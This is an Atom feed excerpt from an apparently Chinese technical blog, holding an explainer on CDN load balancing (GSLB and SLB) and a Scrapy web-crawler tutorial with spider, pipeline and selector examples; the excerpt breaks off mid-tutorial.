<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K0rz3n&#39;s Blog</title>
  
  <subtitle>Shell-is-Only-the-Beginning</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.k0rz3n.com/"/>
  <updated>2019-05-18T10:20:50.775Z</updated>
  <id>https://www.k0rz3n.com/</id>
  
  <author>
    <name>K0rz3n</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CDN 原理浅析</title>
    <link href="https://www.k0rz3n.com/2019/05/18/CDN%20%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    <id>https://www.k0rz3n.com/2019/05/18/CDN 原理浅析/</id>
    <published>2019-05-18T10:20:18.000Z</published>
    <updated>2019-05-18T10:20:50.775Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X01-什么是-CDN"><a href="#0X01-什么是-CDN" class="headerlink" title="0X01 什么是 CDN"></a><strong>0X01 什么是 CDN</strong></h2><p>CDN 全称是Content Delivery Network，也就是内容分发网络，所谓内容分发就是配置了 CDN 以后，用户就能从离自己最近的缓存服务器去获取到自己向原始服务器请求的数据，这样不仅仅提高了访问的速度而且在无形中还隐藏了原始服务器的 ip 地址。</p><p>这就是我最初对 CDN 的认知，那么 CDN 中涉及到了哪些技术呢？</p><p>(1)负载均衡技术<br>(2)内容缓存技术<br>(3)内容分发技术</p><p>另外 负载均衡技术又分为两个层次：全局负载均衡（Global Server Load Balance, GSLB）和服务器负载均衡（Server Load Balance, SLB）。全局负载均衡是指对分别放置在不同的地理位置的服务器群间作负载均衡。服务器负载均衡是指对本地的服务器群做负载均衡。</p><p>可能大家对 GSLB 和 SLB 的实现方式稍微少一点，那么我下面就是想结合实际的例子简单介绍一下 GSLB 和 SLB 的技术</p><h2 id="0X02-GSLB-全局负载均衡"><a href="#0X02-GSLB-全局负载均衡" class="headerlink" title="0X02 GSLB 全局负载均衡"></a><strong>0X02 GSLB 全局负载均衡</strong></h2><h3 id="1-全局负载均衡的理解"><a href="#1-全局负载均衡的理解" class="headerlink" title="1.全局负载均衡的理解"></a><strong>1.全局负载均衡的理解</strong></h3><p>全局负载均衡主要用于在多个区域拥有自己服务器的站点，为了使全球用户只以一个IP地址或域名就能访问到离自己最近的服务器，从而获得最快的访问速度。</p><a id="more"></a><h3 id="2-服务器群的选择"><a href="#2-服务器群的选择" class="headerlink" title="2.服务器群的选择"></a><strong>2.服务器群的选择</strong></h3><p>对于全局负载均衡而言，其核心就是服务器群的选择。对于某个特定的客户，应该将其定向到哪一个服务群？应该使用什么标准来进行这种选择？一般情况下，主要考虑两个因素：临近程度和负载大小。<br>临近机制主要考察服务器群与用户之间的物理距离。选择地理位置最接近用户的服务器集群，可以减少服务响应到达用户所经过的中转次数，从而降低中转节点对服务质量的影响。常见的有两种方式，一种是静态配置，例如根据静态的IP地址配置表进行IP地址到服务器群的映射。另一种方式是动态的检测，例如实时地探测到目标IP的距离（可以采用到达目标IP经过的跳数作为度量单位），然后比较探测结果进行选择。<br>负载机制比较各个服务器群的负载，确定由哪一个服务器群来响应请求。在全局负载均衡中，考察的是服务器群的负载，而不是单个服务器的负载，因此，需要更多地考虑普遍的问题，比如，需要考虑站点的最大连接数、站点的平均响应时间、服务质量等。</p><h3 id="3-图解-GSLB-工作原理"><a href="#3-图解-GSLB-工作原理" class="headerlink" title="3.图解 GSLB 工作原理"></a><strong>3.图解 GSLB 工作原理</strong></h3><p>这里主要是讲我们最常见的一种 GSLB 技术：基于 DNS 的 GSLB,其他两种技术：基于 http 重定向和 ip 欺骗的技术这里就不多介绍了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CDN%20%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%901.jpg" alt="此处输入图片的描述"></p><blockquote><p><strong>注意：</strong></p><p>这里图中的内容服务器其实在实际中也并不是一个单纯的服务器，也是一个小的 负载均衡集群，利用了 SLB 技术，我们后面再介绍</p></blockquote><h3 id="4-实例分析"><a href="#4-实例分析" class="headerlink" title="4.实例分析"></a><strong>4.实例分析</strong></h3><p>我们通过 cloud.tencent.com 的一个实例简单理解一下上面我们说的技术</p><p>下图是我在本地的 ubuntu 上去 dig 目标地址得到的结果</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CDN%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%902.png" alt="此处输入图片的描述"></p><p>下图是我在 vps 上去 dig 目标地址得到的结果</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CDN%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%903.png" alt="此处输入图片的描述"></p><p>分析两张图我们可以发现，首先 cloud.tencent.com 有一个 CNAME 指向了 cloud.tencent-cloud.com ，然后由此分叉，我本地获得的 dns 的解析结果是 CNAME cloud-gz.tencent-cloud.com，国外 vps 的解析结果是 CNAME cloud-hk.tencent-cloud.com</p><p>这个现象其实在上图都有对应，我们 dns 首先将我们请求的 cloud.tencent.com 的 CNAME 设置为我们的 GSLB 设备，GSLB 本身也有 DNS 的功能，于是开始根据用户请求的地理位置寻找并将自己的 CNAME设置为最近的内容分发服务器，并将于是我们就获得了不同的结果，国内得到的是 CNAME 为 cloud-gz.tencent-cloud.com，国外得到的是 CNAME cloud-hk.tencent-cloud.com</p><h2 id="0X03-SLB-服务器负载均衡"><a href="#0X03-SLB-服务器负载均衡" class="headerlink" title="0X03 SLB 服务器负载均衡"></a><strong>0X03 SLB 服务器负载均衡</strong></h2><p>上面提到，SLB 就是对本地的服务器群做负载均衡，也就是说 上面提到的内容服务器其实也是一个服务器群，里面不只有一个 ip ，如下图所示</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CDN%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%904.png" alt="此处输入图片的描述"></p><p>我们可以把这里的 apusapp.com 想象成上面分析的 cloud-gz.tencent-cloud.com 内容节点，实际上也确实是这样，我们其实可以注意到 cloud-gz.tencent-cloud.com DNS 服务器中配置了两个 A 记录，分别指向了两个连续的 IP 地址：139.199.215.179 和 139.199.215.180</p><h2 id="0X04-CDN-概述"><a href="#0X04-CDN-概述" class="headerlink" title="0X04 CDN 概述"></a><strong>0X04 CDN 概述</strong></h2><p>解释了上面两个步骤 CDN 的整体应该就很清楚了。一个CDN网络主要由以下几部分组成：内容缓存设备、内容分发管理设备、本地负载均衡交换机、GSLB设备和CDN管理系统，其网络结构如下图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CDN%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%905.png" alt="此处输入图片的描述"></p><p>其中，内容缓存设备Cache用于缓存内容实体和对缓存内容进行组织和管理。当有用户访问该客户内容时，如果缓存中存在该内容则直接由各缓存服务器响应用户的请求，否则从核心Web服务器中获取该内容，缓存后返回给用户。这样当用户再次访问相同内容或其他用户访问相同内容时，可以直接从缓存中读取，提高了效率。</p><p>内容分发管理设备主要负责核心Web服务器内容到CDN网络内缓存设备的内容推送、删除、校验以及内容的管理、同步。</p><p>GSLB设备则实现CDN全网各缓存节点之间的资源负载均衡，它与各节点的SLB设备保持通信，搜集各节点缓存设备的健康状态、性能、负载等，自动将用户指引到位于其地理区域中的服务器或者引导用户离开拥挤的网络和服务器。还可以通过使用多站点的内容和服务来提高容错性和可用性，防止因本地网或区域网络中断、断电或自然灾害而导致的故障。</p><p><strong>我们还能将其抽象成下面的一幅图</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CDN%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%906.png" alt="此处输入图片的描述"></p><p>CDN管理系统实现对全网设备的管理，对系统的配置。它不仅能对系统中的各个设备进行实时监控，对各种故障产生相应的告警，还能实时观测到系统中总的流量以及各节点的流量，并保存在系统的数据库中，作为统计分析的基础数据，并对日志文件进行管理、报告，作为计费的基础数据。</p><p><a href="https://cloud.tencent.com/developer/article/1349559" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1349559</a><br><a href="https://10z4.com/198.html" target="_blank" rel="noopener">https://10z4.com/198.html</a><br><a href="https://www.cnblogs.com/liyuanhong/articles/7353974.html" target="_blank" rel="noopener">https://www.cnblogs.com/liyuanhong/articles/7353974.html</a><br><a href="https://www.cnblogs.com/foxgab/p/6900101.html" target="_blank" rel="noopener">https://www.cnblogs.com/foxgab/p/6900101.html</a><br><a href="https://www.jianshu.com/p/05eb8365ab5f" target="_blank" rel="noopener">https://www.jianshu.com/p/05eb8365ab5f</a><br><a href="https://blog.csdn.net/adsadadaddadasda/article/details/82902618" target="_blank" rel="noopener">https://blog.csdn.net/adsadadaddadasda/article/details/82902618</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X01-什么是-CDN&quot;&gt;&lt;a href=&quot;#0X01-什么是-CDN&quot; class=&quot;headerlink&quot; title=&quot;0X01 什么是 CDN&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X01 什么是 CDN&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;CDN 全称是Content Delivery Network，也就是内容分发网络，所谓内容分发就是配置了 CDN 以后，用户就能从离自己最近的缓存服务器去获取到自己向原始服务器请求的数据，这样不仅仅提高了访问的速度而且在无形中还隐藏了原始服务器的 ip 地址。&lt;/p&gt;
&lt;p&gt;这就是我最初对 CDN 的认知，那么 CDN 中涉及到了哪些技术呢？&lt;/p&gt;
&lt;p&gt;(1)负载均衡技术&lt;br&gt;(2)内容缓存技术&lt;br&gt;(3)内容分发技术&lt;/p&gt;
&lt;p&gt;另外 负载均衡技术又分为两个层次：全局负载均衡（Global Server Load Balance, GSLB）和服务器负载均衡（Server Load Balance, SLB）。全局负载均衡是指对分别放置在不同的地理位置的服务器群间作负载均衡。服务器负载均衡是指对本地的服务器群做负载均衡。&lt;/p&gt;
&lt;p&gt;可能大家对 GSLB 和 SLB 的实现方式稍微少一点，那么我下面就是想结合实际的例子简单介绍一下 GSLB 和 SLB 的技术&lt;/p&gt;
&lt;h2 id=&quot;0X02-GSLB-全局负载均衡&quot;&gt;&lt;a href=&quot;#0X02-GSLB-全局负载均衡&quot; class=&quot;headerlink&quot; title=&quot;0X02 GSLB 全局负载均衡&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X02 GSLB 全局负载均衡&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&quot;1-全局负载均衡的理解&quot;&gt;&lt;a href=&quot;#1-全局负载均衡的理解&quot; class=&quot;headerlink&quot; title=&quot;1.全局负载均衡的理解&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.全局负载均衡的理解&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;全局负载均衡主要用于在多个区域拥有自己服务器的站点，为了使全球用户只以一个IP地址或域名就能访问到离自己最近的服务器，从而获得最快的访问速度。&lt;/p&gt;
    
    </summary>
    
      <category term="备忘" scheme="https://www.k0rz3n.com/categories/%E5%A4%87%E5%BF%98/"/>
    
    
      <category term="计算机网络" scheme="https://www.k0rz3n.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>Python3 爬虫知识梳理(框架篇)</title>
    <link href="https://www.k0rz3n.com/2019/05/10/python3%20%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86(%E6%A1%86%E6%9E%B6%E7%AF%87)/"/>
    <id>https://www.k0rz3n.com/2019/05/10/python3 爬虫知识梳理(框架篇)/</id>
    <published>2019-05-10T07:59:18.000Z</published>
    <updated>2019-05-13T06:07:54.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X00-scrapy-的安装与使用"><a href="#0X00-scrapy-的安装与使用" class="headerlink" title="0X00 scrapy 的安装与使用"></a><strong>0X00 scrapy 的安装与使用</strong></h2><h3 id="1-windows-下-scrapy-的安装"><a href="#1-windows-下-scrapy-的安装" class="headerlink" title="1.windows 下 scrapy 的安装"></a><strong>1.windows 下 scrapy 的安装</strong></h3><p>windows 下的安装首先需要安装一些依赖库，有些最好使用下载 whl 文件进行本地安装的方法，下面是安装步骤和一些需要本地安装的依赖库</p><p><strong>1.wheel</strong></p><pre><code>pip3 install wheel</code></pre><p><strong>2.lxml</strong></p><pre><code>http://www.lfd.uci.edu/~gohlke/pythonlibs/#lxml</code></pre><p><strong>3.PyOpenssl</strong></p><pre><code>https://pypi.python.org/pypi/pyOpenSSL#downloads</code></pre><p><strong>4.Twisted</strong></p><pre><code>http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted</code></pre><p><strong>5.Pywin32</strong></p><pre><code>https://pypi.org/project/pywin32/#files</code></pre><p><strong>6.Scrapy</strong> </p><pre><code>pip3 install scrapy</code></pre><h3 id="2-scrapy-的基本运行测试"><a href="#2-scrapy-的基本运行测试" class="headerlink" title="2.scrapy 的基本运行测试"></a><strong>2.scrapy 的基本运行测试</strong></h3><p>按照下图的步骤输入，如果最后没有报错就说明安装成功</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%871.png" alt="此处输入图片的描述"></p><a id="more"></a><h3 id="3-补充：anaconda-下的-scrapy-的安装"><a href="#3-补充：anaconda-下的-scrapy-的安装" class="headerlink" title="3.补充：anaconda 下的 scrapy 的安装"></a><strong>3.补充：anaconda 下的 scrapy 的安装</strong></h3><p>如果 windows 本地安装有 anaconda 集成环境的话那么安装 scrapy 是极其简单的，只需要下面一条命令就可以了</p><pre><code>conda install scarpy</code></pre><h2 id="0X01-Scrapy框架基本使用"><a href="#0X01-Scrapy框架基本使用" class="headerlink" title="0X01 Scrapy框架基本使用"></a><strong>0X01 Scrapy框架基本使用</strong></h2><p>本节主要是对一个实例网站进行抓取，然后顺带介绍一下 Scrapy 框架的使用，我们的实例网站是 <a href="http://quotes.toscrape.com/，这是一个官方提供的实例网站，比较经典" target="_blank" rel="noopener">http://quotes.toscrape.com/，这是一个官方提供的实例网站，比较经典</a></p><h3 id="1-分析页面确定爬取思路"><a href="#1-分析页面确定爬取思路" class="headerlink" title="1.分析页面确定爬取思路"></a><strong>1.分析页面确定爬取思路</strong></h3><p>我们要抓取的页面很简单如下所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%872_.png" alt="此处输入图片的描述"></p><p>首先页面没有使用任何的动态加载的技术，我们能够使用正则直接匹配，另外我们翻页也能够使用改变 url 的 offset 来实现</p><p><strong>思路梳理：</strong></p><p>(1)请求第一页得到源代码进行下一步分析<br>(2)获取首页内容并改变 URL 链接准备下一页的请求<br>(3)获取下一页源代码<br>(4)将结果保存为文件格式或者存储进数据库</p><h4 id="3-scrapy-的初次使用"><a href="#3-scrapy-的初次使用" class="headerlink" title="3.scrapy 的初次使用"></a><strong>3.scrapy 的初次使用</strong></h4><p><strong>创建项目</strong></p><pre><code>&gt;&gt;scrapy startproject quotetutorial&gt;&gt;cd quotetutorial&gt;&gt;scrapy genspider quotes quotes.toscrape.com</code></pre><p><strong>使用 pycharm 打开项目</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%873.png" alt="此处输入图片的描述"></p><p><strong>定义存储结构</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%874.png" alt="此处输入图片的描述"></p><p><strong>编写页面解析函数</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%876.png" alt="此处输入图片的描述"></p><p><strong>使用 scrpay shell 进行交互测试</strong></p><pre><code>&gt;&gt;scrapy shell quotes.toscrape.com </code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%875.png" alt="此处输入图片的描述"></p><p><strong>运行我们的“简陋”的爬虫</strong></p><pre><code>&gt;&gt;scrapy crawl quotes</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%877.png" alt="此处输入图片的描述"></p><p>我们可以看到我们想要抓取的第一页的结果已经大致上输出了</p><p><strong>完善我们的爬虫实现每一页的抓取</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%878.png" alt="此处输入图片的描述"></p><p><strong>将我们爬取到的数据保存</strong></p><pre><code>&gt;&gt;scrapy crawl quotes -o quotes.json</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%879.png" alt="此处输入图片的描述"></p><p>除了能保存成 json 后缀的文件以外，我们还能保存成 jl(jsonline，每一行都是一条 json )，或者是 csv 格式，再或者是 xml 格式等，甚至还支持保存到远程 ftp 服务器的形式 </p><pre><code>-o ftp://user:pass@ftp.example.com/path/quotes.json</code></pre><p><strong>对获取到的数据进行其他的处理</strong></p><p>如果有一些 item 是我们不想要的，或者是我们想把 item 保存到数据库的话，上面的方法似乎就不是那么适用了，我们就要借助于 scrapy 给我们提供的另一个组件 pipelines.py 帮我们实现</p><p>比如我们现在有这样的需求，我们想把名言超出我们规定的长度的部分删除，并且加上三个省略号</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8710.png" alt="此处输入图片的描述"></p><p>另外我们如果还想存储进数据库的话，我们还要自己写一个 pipeline </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8711.png" alt="此处输入图片的描述"></p><p>数据库的设置我们需要在 settings.py 中添加配置项</p><pre><code>MONGO_URL = &apos;localhost&apos;MONGO_DB = &apos;quotes&apos;</code></pre><p>然后是我们需要在 settings.py 中开启启动 pipeline 的选项，使我们的配置生效</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8712.png" alt="此处输入图片的描述"></p><h4 id="2-最终代码实现"><a href="#2-最终代码实现" class="headerlink" title="2.最终代码实现"></a><strong>2.最终代码实现</strong></h4><p><strong>quotes.py</strong> </p><pre><code>import...class QuotesSpider(scrapy.Spider):    name = &apos;quotes&apos;    allowed_domains = [&apos;quotes.toscrape.com&apos;]    start_urls = [&apos;http://quotes.toscrape.com/&apos;]    def parse(self, response):        quotes = response.css(&apos;.quote&apos;)        for quote in quotes:            #定义接收对象item            item = QuotetutorialItem()            text = quote.css(&apos;.text::text&apos;).extract_first()            author = quote.css(&apos;.author::text&apos;).extract_first()            tags = quote.css(&apos;.tags .tag::text&apos;).extract()            item[&apos;text&apos;] = text            item[&apos;author&apos;] = author            item[&apos;tags&apos;] = tags            yield item        next = response.css(&apos;.pager .next a::attr(href)&apos;).extract_first()        #拼接下一页的 URL        url = response.urljoin(next)        #使用 scrapy.Request 递归的调用自己实现爬取下一页        yield scrapy.Request(url=url,callback=self.parse)</code></pre><p><strong>items.py</strong></p><pre><code>import...class QuotetutorialItem(scrapy.Item):    # define the fields for your item here like:    # name = scrapy.Field()    text = scrapy.Field()    author = scrapy.Field()    tags = scrapy.Field()</code></pre><p><strong>pipelines.py</strong></p><pre><code>import...#这个类相当于是返回结果的拦截器class QuotetutorialPipeline(object):    def __init__(self):        self.limit = 50    def process_item(self, item, spider):        if item[&apos;text&apos;]:            if len(item[&apos;text&apos;]) &gt;  self.limit:                item[&apos;text&apos;] = item[&apos;text&apos;][:self.limit].rstrip() + &apos;...&apos;            return item        else:            # scrapy 特殊的错误处理函数            return DropItem(&apos;Missing Text&apos;)class MongoPipeline(object):    def __init__(self,mongo_url,mongo_db):        self.mongo_url = mongo_url        self.mongo_db = mongo_db    #这个内置函数能从 settings 里面拿到想要的配置信息    @classmethod    def from_crawler(cls,crawler):        return cls(            mongo_url = crawler.settings.get(&apos;MONGO_URL&apos;),            mongo_db = crawler.settings.get(&apos;MONGO_DB&apos;)        )    #这个方法是爬虫初始化的时候会执行的方法    def open_spider(self,spider):        self.client = pymongo.MongoClient(self.mongo_url)        self.db = self.client[self.mongo_db]    #重写该方法实现对数据的数据库存储    def process_item(self,item,spider):        name = item.__class__.__name__        self.db[name].insert(dict(item))        return item    def close_spider(self,spider):        self.client.close()</code></pre><h4 id="3-最终运行效果"><a href="#3-最终运行效果" class="headerlink" title="3.最终运行效果"></a><strong>3.最终运行效果</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8713.png" alt="此处输入图片的描述"></p><h2 id="0X02-scrapy-命令行详解"><a href="#0X02-scrapy-命令行详解" class="headerlink" title="0X02 scrapy 命令行详解"></a><strong>0X02 scrapy 命令行详解</strong></h2><p>这里仅仅说一些我上面没有提到过的，至于上面已经说过的关于项目的创建以及我们的项目的运行我这里就不再赘述</p><h3 id="1-genspider-选择生成的爬虫对象的模式"><a href="#1-genspider-选择生成的爬虫对象的模式" class="headerlink" title="1.genspider 选择生成的爬虫对象的模式"></a><strong>1.genspider 选择生成的爬虫对象的模式</strong></h3><p>scrapy 在生成爬虫对象的时候可以选择生成的模式，不同的模式会生成不同的爬虫模板，模式的选择如下</p><pre><code>λ scrapy genspider -lAvailable templates:  basic  crawl  csvfeed  xmlfeedλ scrapy genspider -t crawl zhihu www.zhihu.comCreated spider &apos;zhihu&apos; using template &apos;crawl&apos; in module:  testpro.spiders.zhihu</code></pre><h3 id="2-check-检查代码的正确性"><a href="#2-check-检查代码的正确性" class="headerlink" title="2.check 检查代码的正确性"></a><strong>2.check 检查代码的正确性</strong></h3><pre><code>λ scrapy check----------------------------------------------------------------------Ran 0 contracts in 0.000sOK</code></pre><h3 id="3-list-返回项目中所有的-spider-的名称"><a href="#3-list-返回项目中所有的-spider-的名称" class="headerlink" title="3.list 返回项目中所有的 spider 的名称"></a><strong>3.list 返回项目中所有的 spider 的名称</strong></h3><pre><code>λ scrapy listzhihu</code></pre><h3 id="4-fecth-快速获取网页返回结果"><a href="#4-fecth-快速获取网页返回结果" class="headerlink" title="4.fecth 快速获取网页返回结果"></a><strong>4.fecth 快速获取网页返回结果</strong></h3><p><strong>基本请求</strong></p><pre><code>λ scrapy fetch http://www.baidu.com</code></pre><p><strong>不需要日志信息</strong></p><pre><code>λ scrapy fetch --nolog http://www.baidu.com</code></pre><p><strong>返回响应头</strong></p><pre><code>λ scrapy fetch --nolog  --headers http://www.baidu.com</code></pre><p><strong>拒绝重定向</strong></p><pre><code>λ scrapy fetch --nolog  --no-redirect http://www.baidu.com</code></pre><h3 id="5-view-使用浏览器快速查看响应"><a href="#5-view-使用浏览器快速查看响应" class="headerlink" title="5.view 使用浏览器快速查看响应"></a><strong>5.view 使用浏览器快速查看响应</strong></h3><pre><code>λ scrapy view http://www.baidu.com</code></pre><blockquote><p><strong>注意：</strong></p><p>这里浏览器打开的是 dump 到本地的页面文件，而不是直接去访问网站</p></blockquote><h3 id="6-shell-进入命令行交互模式方便调试"><a href="#6-shell-进入命令行交互模式方便调试" class="headerlink" title="6.shell 进入命令行交互模式方便调试"></a><strong>6.shell 进入命令行交互模式方便调试</strong></h3><pre><code>λ scrapy shell http://www.baidu.com</code></pre><h3 id="7-parse-格式化显示页面的解析结果"><a href="#7-parse-格式化显示页面的解析结果" class="headerlink" title="7.parse 格式化显示页面的解析结果"></a><strong>7.parse 格式化显示页面的解析结果</strong></h3><pre><code>λ scrapy parse  http://quotes.toscrape.com -c parse</code></pre><h3 id="8-settings-获取配置信息"><a href="#8-settings-获取配置信息" class="headerlink" title="8.settings 获取配置信息"></a><strong>8.settings 获取配置信息</strong></h3><pre><code>λ scrapy settings --get MONGO_URLlocalhost</code></pre><h3 id="9-runspider-运行爬虫文件启动项目"><a href="#9-runspider-运行爬虫文件启动项目" class="headerlink" title="9.runspider 运行爬虫文件启动项目"></a><strong>9.runspider 运行爬虫文件启动项目</strong></h3><p>当然运行前需要进入对应的文件目录</p><pre><code>λ scrapy runspider quotes.py</code></pre><h3 id="10-查看对应的版本"><a href="#10-查看对应的版本" class="headerlink" title="10.查看对应的版本"></a><strong>10.查看对应的版本</strong></h3><pre><code>λ  scrapy version -vScrapy       : 1.6.0lxml         : 4.3.3.0libxml2      : 2.9.5cssselect    : 1.0.3parsel       : 1.5.1w3lib        : 1.20.0Twisted      : 19.2.0Python       : 3.7.2 (tags/v3.7.2:9a3ffc0492, Dec 23 2018, 23:09:28) [MSC v.1916 64 bit (AMD64)]pyOpenSSL    : 19.0.0 (OpenSSL 1.1.1b  26 Feb 2019)cryptography : 2.6.1Platform     : Windows-10-10.0.17763-SP0</code></pre><h2 id="0X03-scrapy-中选择器的用法"><a href="#0X03-scrapy-中选择器的用法" class="headerlink" title="0X03 scrapy 中选择器的用法"></a><strong>0X03 scrapy 中选择器的用法</strong></h2><p>我们使用官方文档提供的实例网站来进行测试，网站的源码如下：</p><pre><code>&lt;html&gt; &lt;head&gt;  &lt;base href=&apos;http://example.com/&apos; /&gt;  &lt;title&gt;Example website&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;div id=&apos;images&apos;&gt;   &lt;a href=&apos;image1.html&apos;&gt;Name: My image 1 &lt;br /&gt;&lt;img src=&apos;image1_thumb.jpg&apos; /&gt;&lt;/a&gt;   &lt;a href=&apos;image2.html&apos;&gt;Name: My image 2 &lt;br /&gt;&lt;img src=&apos;image2_thumb.jpg&apos; /&gt;&lt;/a&gt;   &lt;a href=&apos;image3.html&apos;&gt;Name: My image 3 &lt;br /&gt;&lt;img src=&apos;image3_thumb.jpg&apos; /&gt;&lt;/a&gt;   &lt;a href=&apos;image4.html&apos;&gt;Name: My image 4 &lt;br /&gt;&lt;img src=&apos;image4_thumb.jpg&apos; /&gt;&lt;/a&gt;   &lt;a href=&apos;image5.html&apos;&gt;Name: My image 5 &lt;br /&gt;&lt;img src=&apos;image5_thumb.jpg&apos; /&gt;&lt;/a&gt;  &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>运行下面代码进入交互模式</p><pre><code>scrapy shell https://docs.scrapy.org/en/latest/_static/selectors-sample1.html</code></pre><p>scrapy 为我们提供了一个内置的选择器类 Selector ，我们可以通过 response.selector 来进行使用</p><h3 id="1-xpath-选择器"><a href="#1-xpath-选择器" class="headerlink" title="1.xpath 选择器"></a><strong>1.xpath 选择器</strong></h3><h4 id="1-xpath-选择器提取文本内容"><a href="#1-xpath-选择器提取文本内容" class="headerlink" title="(1)xpath 选择器提取文本内容"></a><strong>(1)xpath 选择器提取文本内容</strong></h4><p>简单看一下 xptah 的通用语法</p><pre><code>nodename    选取此节点的所有子节点。/    从根节点选取。//    从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。@    选取属性。.    选取当前节点。..    选取当前节点的父节点。*    匹配任何元素节点。@*    匹配任何属性节点。/bookstore/book[1]    选取属于 bookstore 子元素的第一个 book 元素。/bookstore/book[last()]    选取属于 bookstore 子元素的最后一个 book 元素。/bookstore/book[last()-1]    选取属于 bookstore 子元素的倒数第二个 book 元素。/bookstore/book[position()&lt;3]    选取最前面的两个属于 bookstore 元素的子元素的 book 元素。//title[@lang]    选取所有拥有名为 lang 的属性的 title 元素。//title[@lang=&apos;eng&apos;]    选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。/bookstore/book[price&gt;35.00]    选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。/bookstore/book[price&gt;35.00]/title    选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。</code></pre><p>提取 title 的内容</p><pre><code>In [2]: response.selector.xpath(&apos;/html/head/title&apos;).extract_first(   ...: )Out[2]: &apos;&lt;title&gt;Example website&lt;/title&gt;&apos;In [3]: response.selector.xpath(&apos;/html/head/title/text()&apos;).extract   ...: _first()Out[3]: &apos;Example website&apos;</code></pre><blockquote><p><strong>注意：</strong></p><p>我们还可以将上面的命令简写成 response.xpath()</p></blockquote><h4 id="（2）xpath-选择器提取属性内容"><a href="#（2）xpath-选择器提取属性内容" class="headerlink" title="（2）xpath 选择器提取属性内容"></a><strong>（2）xpath 选择器提取属性内容</strong></h4><p>我们可以使用 xpath 提取 a 标签的属性 href</p><pre><code>In [16]: response.xpath(&apos;//a/@href&apos;).extract()Out[16]: [&apos;image1.html&apos;, &apos;image2.html&apos;, &apos;image3.html&apos;, &apos;image4.html&apos;, &apos;image5.html&apos;]</code></pre><h3 id="2-css-选择器"><a href="#2-css-选择器" class="headerlink" title="2.css 选择器"></a><strong>2.css 选择器</strong></h3><h4 id="1-css-选择器提取文本内容"><a href="#1-css-选择器提取文本内容" class="headerlink" title="(1)css 选择器提取文本内容"></a><strong>(1)css 选择器提取文本内容</strong></h4><p>提取 title 的内容</p><pre><code>In [5]: response.selector.css(&apos;head &gt; title::text&apos;)                Out[5]: [&lt;Selector xpath=&apos;descendant-or-self::head/title/text()&apos; data=&apos;Example website&apos;&gt;]                                             In [6]: response.selector.css(&apos;head &gt; title::text&apos;).extract_first(    ...: )                                                          Out[6]: &apos;Example 